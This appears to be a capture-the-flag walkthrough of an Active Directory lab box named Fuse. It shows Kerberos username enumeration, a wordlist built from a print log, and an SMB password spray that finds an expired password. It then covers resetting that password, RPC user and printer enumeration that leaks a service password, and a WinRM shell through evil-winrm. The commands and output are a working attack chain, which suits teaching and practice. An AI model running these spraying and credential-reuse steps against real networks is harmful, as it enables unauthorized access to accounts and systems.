# 15 - LDAP

```bash
┌─[user@parrot]─[10.10.14.18]─[~/htb/fuse]
└──╼ $ kerbrute userenum   -d fabricorp.local --dc 10.10.10.193  user.lst  

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 08/07/21 - Ronnie Flathers @ropnop

2021/08/07 14:31:35 >  Using KDC(s):
2021/08/07 14:31:35 >   10.10.10.193:88

2021/08/07 14:31:35 >  [+] VALID USERNAME:       bhult@fabricorp.local
2021/08/07 14:31:35 >  [+] VALID USERNAME:       pmerton@fabricorp.local
2021/08/07 14:31:35 >  [+] VALID USERNAME:       sthompson@fabricorp.local
2021/08/07 14:31:35 >  [+] VALID USERNAME:       tlavel@fabricorp.local
2021/08/07 14:31:35 >  [+] VALID USERNAME:       administrator@fabricorp.local
```

The very first thing we should do is enumerate the usernames we found earlier against the DC. Always add another username, that you know it does not exist, to the list to ensure the service isn't configured in such a way to reply *valid* for every username.

All the accounts seem to be valid. Let's proceed to password generation.


# Custom word generation
```bash
┌─[user@parrot]─[10.10.14.18]─[~/htb/fuse]
└──╼ $ cewl -d 8 -m 7 -w wordlist --with-numbers http://fuse.fabricorp.local/papercut/logs/html/index.htm
```

* `-d`                             Depth to spider to,
* `-m`                             Minimum word length
* `-w`                             Write the output to the file.
* `--with-numbers`   Accept words with numbers


The print log from the webserver is the perfect candidate for password generation.


# PASSWORD MUST CHANGE 
```bash
┌─[user@parrot]─[10.10.14.18]─[~/htb/fuse]
└──╼ $ cme smb 10.10.10.193 -u user.lst -p wordlist --shares
SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:PaperCut STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:GRAYSCALE STATUS_LOGON_FAILURE                     
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:papercut STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Notepad STATUS_LOGON_FAILURE                      
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:sthompson STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:LONWK019 STATUS_LOGON_FAILURE                         
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Printer STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Document STATUS_LOGON_FAILURE                       
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Grayscale STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Software STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Copyright STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Location STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Refresh STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:NotepadLETTER STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Language STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:logging STATUS_LOGON_FAILURE                
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:printing STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:program STATUS_LOGON_FAILURE            
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:additional STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:features STATUS_LOGON_FAILURE             
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:International STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:pmerton STATUS_LOGON_FAILURE                 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Starter STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:bnielson STATUS_LOGON_FAILURE             
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Meeting STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Minutes STATUS_LOGON_FAILURE                            
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:LONWK015 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:mountain STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:request STATUS_LOGON_FAILURE                                                                                   
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
```

After doing a password spray, we discover that bhult has the password 'Fabricorp01' but it has expired. Therefore, we need a tool to change the password to log in. Bear in mind that password resets every two minutes and the user does not have remote access privilege.


# Password change and RPC
```sql
┌─[user@parrot]─[10.10.14.18]─[~/htb/fuse]
└──╼ $ smbpasswd  -r 10.10.10.193 -U bhult && rpcclient 10.10.10.193 -U 'bhult'
Old SMB password:Fabricorp01
New SMB password:Refikpass1625
Retype new SMB password:Refikpass1625
Password changed for user bhult
Enter WORKGROUP\bhult's password:                                                                                                                                                             

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[svc-print] rid:[0x450]
user:[bnielson] rid:[0x451]
user:[sthompson] rid:[0x641]
user:[tlavel] rid:[0x642]
user:[pmerton] rid:[0x643]
user:[svc-scan] rid:[0x645]
user:[bhult] rid:[0x1bbd]
user:[dandrews] rid:[0x1bbe]
user:[mberbatov] rid:[0x1db1]
user:[astein] rid:[0x1db2]
user:[dmuir] rid:[0x1db3]
```


Let's add these new users to our list.

# Printer password
```bash
rpcclient $> enumprinters 
        flags:[0x800000]
        name:[\\10.10.10.193\HP-MFT01]
        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
        comment:[]
```

We know that there is a printer in the AD because of the print logger.


# svc-print

```bash
┌─[user@parrot]─[10.10.14.18]─[~/htb/fuse]
└──╼ $ cme winrm 10.10.10.193 -u user.lst  -p '$fab@s3Rv1ce$1'
WINRM       10.10.10.193    5985   FUSE             [*] Windows 10.0 Build 14393 (name:FUSE) (domain:fabricorp.local)
WINRM       10.10.10.193    5985   FUSE             [*] http://10.10.10.193:5985/wsman
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\scan2docs:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 (Pwn3d!)

```

The user has remote access. Let us log in with evil-winrm.


# Shell
```bash
┌─[user@parrot]─[10.10.14.18]─[~/htb/fuse]
└──╼ $ evil-winrm -i 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1'                              
                                               
Evil-WinRM shell v2.4               

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-print\Documents>
```